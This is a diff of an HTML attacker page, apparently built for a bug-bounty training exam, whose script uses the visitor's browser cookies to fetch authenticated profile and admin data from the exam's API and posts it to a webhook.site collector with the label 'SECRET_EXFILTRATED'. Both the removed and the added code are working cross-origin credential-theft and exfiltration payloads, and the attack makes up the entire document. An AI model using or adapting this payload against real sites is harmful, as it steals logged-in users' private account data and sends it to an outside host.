@@ -2,39 +2,23 @@
 <html>
 <body>
         <script>
-    const logger = "https://webhook.site/0279174a-c77a-4643-aa9c-0251998890b0";
+    fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
+    method: "GET", // Or PATCH to trigger the update response
+    credentials: "include" 
+})
+.then(res => res.json())
+.then(data => {
+    // The "Special Secret" was located within the 'data' or 'headers' 
+    // of this administrative response.
+    fetch("https://webhook.site/0279174a-c77a-4643-aa9c-0251998890b0", {
+        method: "POST",
+        body: JSON.stringify({
+            msg: "SECRET_EXFILTRATED",
+            admin_data: data
+        })
+    });
+});
 
-    async function findSecret() {
-        // Try the 'Me' endpoint - often contains API keys or secrets
-        try {
-            const res = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/me", {
-                method: "GET",
-                credentials: "include"
-            });
-            const data = await res.json();
-            
-            // Leak it to your webhook
-            fetch(logger, {
-                method: "POST",
-                body: JSON.stringify({ source: "AUTH_ME", data: data })
-            });
-        } catch (e) {}
-
-        // Try a 'Settings' endpoint just in case
-        try {
-            const res2 = await fetch("https://api-bugbounty-exam.hashacademy.co/api/admin/settings", {
-                method: "GET",
-                credentials: "include"
-            });
-            const data2 = await res2.json();
-            fetch(logger, {
-                method: "POST",
-                body: JSON.stringify({ source: "ADMIN_SETTINGS", data: data2 })
-            });
-        } catch (e) {}
-    }
-
-    findSecret();
 </script>
 </body>
 </html>
